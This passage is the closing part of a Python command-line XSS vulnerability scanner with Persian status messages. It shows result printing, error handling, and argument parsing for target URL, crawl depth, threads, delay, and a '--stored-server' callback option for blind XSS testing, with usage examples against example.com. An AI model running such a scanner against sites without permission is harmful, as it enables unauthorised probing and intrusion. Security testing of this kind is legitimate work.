                    print(f"{Fore.RED}  {i}. {vuln['type']} - {vuln['url']} (Score: {vuln['score']}/20)")
            else:
                print(f"\n{Fore.GREEN}✅ هیچ آسیب‌پذیری تایید شده‌ای یافت نشد.")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}اسکن توسط کاربر متوقف شد.")
        except Exception as e:
            print(f"\n{Fore.RED}خطا در اجرای اسکن: {e}")
        finally:
            if self.driver:
                self.driver.quit()

def main():
    parser = argparse.ArgumentParser(
        description='Advanced XSS Scanner - ابزار پیشرفته تشخیص XSS',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python advanced_xss_scanner.py -u https://example.com
  python advanced_xss_scanner.py -u https://example.com -d 5 -t 10 --delay 2
  python advanced_xss_scanner.py -u https://example.com --stored-server http://your-server.com
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--stored-server', help='Server URL for stored/blind XSS testing')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}Error: URL must start with http:// or https://")
        sys.exit(1)
    
    # Initialize and run scanner
    scanner = AdvancedXSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        threads=args.threads
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()